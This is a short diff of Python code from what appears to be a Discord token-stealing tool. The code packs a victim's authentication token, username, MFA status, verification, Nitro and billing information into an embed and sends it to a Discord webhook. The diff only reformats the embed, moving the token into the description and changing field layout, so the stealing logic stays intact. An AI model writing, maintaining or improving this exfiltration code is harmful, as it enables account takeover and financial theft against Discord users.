@@ -162,7 +162,6 @@ def start():
             embed: DiscordEmbed = DiscordEmbed(color=DiscordColor.brand_green())
             if data["avatar"] is not None:
                 embed.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{data['id']}/{data['avatar']}")
-            embed.set_description(description=f"Token: ||{token}||")
             embed.add_field(name="\u200b", value=f'```yaml' +
                                                  f'\nusername: {data["username"] + "#" + data["discriminator"]}' +
                                                  f'\nmfa_enabled: {str(data["mfa_enabled"])}' +
@@ -170,7 +169,8 @@ def start():
                                                  f'\nverified: {str(data["verified"])}' +
                                                  f'\nnitro: {nitro}' +
                                                  f'\nbilling: {billing}```',
-                            inline=True)
+                            inline=False)
+            embed.set_description(description=f"`{token}`")
             discord_webhook.add_embed(embed=embed)
         discord_webhook.execute()
 
